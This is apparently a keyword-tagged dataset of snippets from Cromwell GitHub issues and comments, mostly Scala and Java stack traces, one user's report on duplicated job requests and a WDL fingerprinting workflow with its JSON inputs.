Performance,$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell-0.19.jar:0.19]; > at scala.collection.immutable.List.foreach(List.scala:381) ~[cromwell-0.19.jar:0.19]; > at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell-0.19.jar:0.19]; > at scala.collection.immutable.List.map(List.scala:285) ~[cromwell-0.19.jar:0.19]; > at slick.driver.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction.run(JdbcActionComponent.scala:522) ~[cromwell-0.19.jar:0.19]; > at slick.driver.JdbcActionComponent$SimpleJdbcDriverAction.run(JdbcActionComponent.scala:32) ~[cromwell-0.19.jar:0.19]; > at slick.driver.JdbcActionComponent$SimpleJdbcDriverAction.run(JdbcActionComponent.scala:29) ~[cromwell-0.19.jar:0.19]; > at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.liftedTree1$1(DatabaseComponent.scala:237) ~[cromwell-0.19.jar:0.19]; > at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.run(DatabaseComponent.scala:237) ~[cromwell-0.19.jar:0.19]; > at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) ~[na:1.8.0_74]; > at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) ~[na:1.8.0_74]; > at java.lang.Thread.run(Thread.java:745) ~[na:1.8.0_74]; > Caused by: org.hsqldb.HsqlException: integrity constraint violation: unique constraint or index violation; UK_SYM_WORKFLOW_EXECUTION_ID_SCOPE_NAME_ITERATION_IO table: SYMBOL; > at org.hsqldb.error.Error.error(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.Constraint.getException(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.index.IndexAVLMemory.insert(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.persist.RowStoreAVL.indexRow(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.TransactionManagerMVCC.addInsertAction(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.Session.addInsertAction(Unknown Source) ~[cromwell-0.19.jar:0.19]; > at org.hsqldb.Table.insertSingleRow(Unknown Source) ~[cromwell-0.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/869:3834,concurren,concurrent,3834,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/869,1,['concurren'],['concurrent']
Performance,$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.mutable.ResizableArray$class.foreach(ResizableArray.scala:59) ~[cromwell.jar:0.19]; at scala.collection.mutable.ArrayBuffer.foreach(ArrayBuffer.scala:48) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$class.cromwell$engine$backend$Backend$$hashGivenDockerHash(Backend.scala:193) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at scala.util.Success.map(Try.scala:237) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) ~[cromwell.jar:0.19]; at akk,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:4311,concurren,concurrent,4311,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['concurren'],['concurrent']
Performance,$apply$1.apply(\; BackendWorkflowInitializationActor.scala:155); at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:253); at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91\; ); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.net.SocketException: Socket is closed; at sun.security.ssl.SSLSocketImpl.getInputStream(SSLSocketImpl.java:2218); at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:642); at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536); at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441); at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); at com.google.api.client.http.javanet.NetHttpReques,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2009:2276,concurren,concurrent,2276,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2009,1,['concurren'],['concurrent']
Performance,"$common$api$PipelinesApiRequestWorker$$handleBatch(PipelinesApiRequestWorker.scala:53); at cromwell.backend.google.pipelines.common.api.PipelinesApiRequestWorker$$anonfun$receive$1.applyOrElse(PipelinesApiRequestWorker.scala:36); at akka.actor.Actor.aroundReceive(Actor.scala:517); at akka.actor.Actor.aroundReceive$(Actor.scala:515); at cromwell.backend.google.pipelines.common.api.PipelinesApiRequestWorker.aroundReceive(PipelinesApiRequestWorker.scala:19); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); at akka.actor.ActorCell.invoke(ActorCell.scala:557); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); at akka.dispatch.Mailbox.run(Mailbox.scala:225); at akka.dispatch.Mailbox.exec(Mailbox.scala:235); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 2019-04-29 00:02:24,760 cromwell-system-akka.dispatchers.backend-dispatcher-139 WARN - PAPI request worker PAPIQueryWorker-aaa95e49-59b4-4de6-864d-22920eac6164 terminated. 99 run creation requests, 1 status poll requests, and 0 abort requests will be reconsidered. If any of those succeeded in the cloud before the batch request failed, they might be run twice. Exception details: cromwell.backend.google.pipelines.common.api.PipelinesApiRequestManager$$anonfun$1$$anon$1: PipelinesApiRequestHandler actor termination caught by manager; ```. Of note, I am running Cromwell 40 with the following `java -Xmx100g -Dconfig.file=google.conf -jar cromwell-40.jar server` on a 16-core highmem system that has 102g of RAM. Of those 102G, only 30G are in use per `htop` (including both active and cache). Cromwell does continue, but the concern, as noted in the error, is that 99 jobs might now be duplicated. If I run with just 1 or 2 jobs, I don't get this message.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4914:5148,cache,cache,5148,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4914,1,['cache'],['cache']
Performance,$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Failed; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdl$1(CromwellTestKitSpec.scala:323); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventually.makeAValiantAtte,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:4695,concurren,concurrent,4695,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,2,['concurren'],['concurrent']
Performance,$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Succeeded; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdlAndAssertOutputs$1(CromwellTestKitSpec.scala:344); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventual,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4457:4844,concurren,concurrent,4844,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4457,1,['concurren'],['concurrent']
Performance,"$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: isEmpty was false, and Some(false) did not contain true Instead, a.status.messages = List(Unknown status) and e.status.messages = List(womp womp); at org.scalatest.Assertions.newAssertionFailedException(Assertions.scala:528); at org.scalatest.Assertions.newAssertionFailedException$(Assertions.scala:527); at cromwell.core.TestKitSuite.newAssertionFailedException(TestKitSuite.scala:16); at org.scalatest.Assertions$AssertionsHelper.macroAssert(Assertions.scala:501); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$5",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:5421,concurren,concurrent,5421,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,1,['concurren'],['concurrent']
Performance,"$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.google.cloud.storage.StorageException: 503 Service Unavailable; {; ""error"": {; ""errors"": [; {; ""domain"": ""global"",; ""reason"": ""backendError"",; ""message"": ""Backend Error""; }; ],; ""code"": 503,; ""message"": ""Backend Error""; }; }. 	at com.google.cloud.storage.spi.DefaultStorageRpc.translate(DefaultStorageRpc.java:190); 	at com.google.cloud.storage.spi.DefaultStorageRpc.write(DefaultStorageRpc.java:536); 	at com.google.cloud.storage.BlobWriteChannel$1.run(BlobWriteChannel.java:49); 	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); 	at com.google.cloud.RetryHelper.doRetry(RetryHelper.java:179); 	at com.google.cloud.RetryHelper.runWithRetries(RetryHelper.java:244); 	at com.google.cloud.storage.BlobWriteChannel.flushBuffer(BlobWriteChannel.java:46); 	at com.google.cloud.BaseWriteChannel.close(BaseWriteChann",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1924:2027,concurren,concurrent,2027,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1924,1,['concurren'],['concurrent']
Performance,$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: cromwell.core.CromwellFatalException: com.google.cloud.storage.StorageException: Connection has been shutdown: javax.net.ssl.SSLException: java.net.SocketException: Broken pipe; 	at cromwell.core.CromwellFatalException$.apply(core.scala:17); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:37); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:36); 	... 15 more; Caused by: com.google.cloud.storage.StorageException: Connection has been shutdown: javax.net.ssl.SSLException: java.net.SocketException: Broken pipe; 	at com.google.cloud.storage.spi.DefaultStorageRpc.translate(DefaultStorageRpc.java:202); 	at com.google.cloud.storage.spi.DefaultStorageRpc.write(DefaultStorageRpc.java:582); 	at com.google.cloud.storage.BlobWriteChannel$1.run(BlobWriteChannel.java:50); 	at java.util.conc,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2183:1762,concurren,concurrent,1762,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2183,1,['concurren'],['concurrent']
Performance,$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.IllegalArgumentException; 	at sun.nio.fs.UnixPath.subpath(UnixPath.java:346); 	at sun.nio.fs.UnixPath.subpath(UnixPath.java:43); 	at cromwell.backend.io.JobPathsWithDocker.toDockerPath(JobPathsWithDocker.scala:35); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$class.toUnixPath(SharedFileSystemAsyncJobExecutionActor.scala:107); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.toUnixPath(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$$anonfun$commandLineValueMapper$1.apply(SharedFileSystemAsyncJobExecutionActor.scala:127); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$$anonfun$commandLineValueMapper$1.apply(SharedFileSystemAsyncJobExecutionActor.scala:127); 	at wdl4s.command.ParameterCommandPart.instan,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1944:7884,concurren,concurrent,7884,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1944,1,['concurren'],['concurrent']
Performance,$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.util.NoSuchElementException; 	at java.util.ArrayList$Itr.next(ArrayList.java:854); 	at scala.collection.convert.Wrappers$JIteratorWrapper.next(Wrappers.scala:43); 	at scala.collection.IterableLike$class.head(IterableLike.scala:107); 	at scala.collection.AbstractIterable.head(Iterable.scala:54); 	at cromwell.backend.impl.aws.AwsAsyncJobExecutionActor.execute(AwsAsyncJobExecutionActor.scala:53); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$executeAsync$1.apply(StandardAsyncExecutionActor.scala:242); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$executeAsync$1.apply(StandardAsyncExecutionActor.scala:242); 	at scala.util.Try$.apply(Try.scala:192); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.executeAsync(StandardAsyncExecutionActor.scala:242); 	at cromwell.backend.im,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1966:1592,concurren,concurrent,1592,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1966,1,['concurren'],['concurrent']
Performance,$super$processEvent(WorkflowExecutionActor.scala:32); 	at akka.actor.LoggingFSM$class.processEvent(FSM.scala:799); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.processEvent(WorkflowExecutionActor.scala:32); 	at akka.actor.FSM$class.akka$actor$FSM$$processMsg(FSM.scala:657); 	at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:651); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:496); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.aroundReceive(WorkflowExecutionActor.scala:32); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: lenthall.exception.AggregatedException: :; Variable 'non_existent_scatter_variable' not found; 	at lenthall.util.TryUtil$.sequenceIterable(TryUtil.scala:26); 	at lenthall.util.TryUtil$.sequence(TryUtil.scala:33); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.cromwell$engine$workflow$lifecycle$execution$WorkflowExecutionActor$$startRunnableScopes(WorkflowExecutionActor.scala:373); 	... 20 common frames omitted; 	Suppressed: wdl4s.exception.VariableNotFoundException$$anon$1: Variable 'non_existent_scatter_variable' not found; 		at wdl4s.exception.VariableNotFoundException$.apply(LookupException.scala:17); 		at wdl4s.Scope$$anonfun$6.apply(Scope.scala:268); 		at wdl4s.Scope$$anonfun$6.apply(Scope.scala:268); 		at scala.Option.getOrElse(Option.scala:121); 		at wdl4s.Scope$class.lookup$1(Scope.scala:267); 		,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2020:2946,concurren,concurrent,2946,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2020,1,['concurren'],['concurrent']
Performance,"${CLEAN_SAMPLE}.bai"", ""/seq/picard_aggregation/${PROJECT}/${CLEAN_SAMPLE}/current/${CLEAN_SAMPLE}.bai""]; 		 File genotypes = ""/seq/references/reference_genotypes/non-hapmap/${PROJECT}/Homo_sapiens_assembly19/${CLEAN_SAMPLE}.vcf"". 		 call Fingerprint {; 		 	input:; 		 		PICARD=PICARD,; 		 		input_bam=bams[0],; 		 		input_bam_index=indexes[0],; 			 haplotype_database_file=haplotype_database_file,; 		 	 	genotypes=genotypes,; 				sample=SAMPLE,; 		 }. 		 call Fingerprint as FingerprintOther {; 		 	input:; 		 		PICARD=PICARD,; 		 		input_bam=bams[1],; 		 		input_bam_index=indexes[1],; 			 haplotype_database_file=haplotype_database_file,; 		 	 	genotypes=genotypes,; 				sample=COMPARE_SAMPLE,; 		 }. 		 call CrossCheckFingerprints {; 	 		input:; 	 			PICARD=PICARD,; 	 			input_bams=bams,; 	 			input_bam_indexes=indexes,; 	 			haplotype_database_file=haplotype_database_file,; 	 			metrics_filename=CLEAN_SAMPLE+""_and_""+CLEAN_COMPARE_SAMPLE+"".crosscheck""; 		 }. 		 output {; 		 	Fingerprint.*; 		 	FingerprintOther.*; 		 	CrossCheckFingerprints.*; 		 }; 	}; }; ```. And a json to go with it:; ```; {; ""FingerprintSamples.PICARD"": ""/seq/software/picard/current/bin/picard.jar"",; ""FingerprintSamples.haplotype_database_file"": ""/seq/references/Homo_sapiens_assembly19/v1/Homo_sapiens_assembly19.haplotype_database.txt"",; ""FingerprintSamples.SamplesTSV"": ""sampleSetTest.txt""; }; ```. This is 